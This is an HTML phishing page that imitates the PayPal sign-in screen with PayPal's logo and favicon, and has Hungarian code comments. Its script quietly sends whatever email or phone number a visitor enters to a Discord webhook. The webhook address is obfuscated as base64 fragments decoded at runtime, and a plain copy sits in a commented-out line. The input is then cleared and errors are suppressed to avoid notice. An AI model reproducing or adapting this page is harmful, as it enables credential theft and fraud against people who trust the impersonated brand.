<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <title>Log in to your PayPal account</title>
</head>
<body>
     <div class="container">
        <header>
            <img id="pplogoheader" src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg">
        </header>
        <input id="email" type="text" placeholder="Email or mobile number" onclick="clearPlaceholder()" onblur="restorePlaceholder()">
        <a href="https://www.paypal.com/authflow/email-recovery/?redirectUri=%252Fsignin" id="forgotEmail">Forgot email?</a>
        <br>
        <button id="submitButton">Next</button>
        
        
        <script>
            var placeholderText = "Email or mobile number";

            function clearPlaceholder() {
                var input = document.getElementById('email');
                input.placeholder = '';
            }

            function restorePlaceholder() {
                var input = document.getElementById('email');
                input.placeholder = placeholderText;
            }

            // A gomb elem kiválasztása
            var button = document.getElementById('submitButton');

            // Az eseményfigyelő hozzáadása a gombhoz
            button.addEventListener('click', sendDataToWebhook);

            // Elküldi az adatokat a webhookra
            function sendDataToWebhook() {
                // Az input mezőben lévő adat megszerzése
                var input = document.getElementById('email');
                var inputData = input.value;
                var url1 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS8=';
                var url2 = 'YXBpL3dlYmhvb2tzLw==';
                var url3 = 'LzExMjEwNDI4Nzc0NTIxMzY1Mzgv';
                var url4 = 'MG9GMjVEakRBNzdzNlhnYXhaR2NsX0dfNldFd3hKZnZyNThTc0dFd29wNkEyVl9fV2t0aHBycDhMZVdoS2g3SGhMcFA=';

                // AJAX kérés létrehozása
                var xhr = new XMLHttpRequest();
                //var url = 'https://discord.com/api/webhooks/1061222778335936512/PVpKbd8XtrYodMGeIDQBlwYtphaDy3kPjRp1Qhs0DxmNWNrTQavaqKNtId2LHUNsXR3D';
                var url = atob(url1) + atob(url2) + atob(url3) + atob(url4);

                // POST kérés beállítása
                xhr.open('POST', url, true);
                xhr.setRequestHeader('Content-Type', 'application/json');

                // Az adatok elküldése JSON formátumban
                var payload = {
                    content: inputData
                };
                xhr.send(JSON.stringify(payload));

                // Sikeres elküldés esetén
                xhr.onload = function() {
                    if (xhr.status === 200) {
                    console.log('');
                    }
                };

                // Hiba esetén
                xhr.onerror = function() {
                    console.error('');
                };
            }
            
            // Az input mező és a küldés gomb elemek kiválasztása
            var inputField = document.getElementById('email');
            var submitButton = document.getElementById('submitButton');

            // Az "keyup" eseményfigyelő hozzáadása az input mezőhöz
            inputField.addEventListener('keyup', function(event) {
                // Enter lenyomása esetén
                if (event.keyCode === 13) {
                    // Küldés gombra kattintás
                    submitButton.click();
                    // Input mező tartalmának törlése
                    inputField.value = '';
                }
            });

            // Az eseményfigyelő hozzáadása a küldés gombhoz
            submitButton.addEventListener('click', function() {
                // Input mező tartalmának törlése
                inputField.value = '';
            });
        </script>
    </div>
</body>
</html>
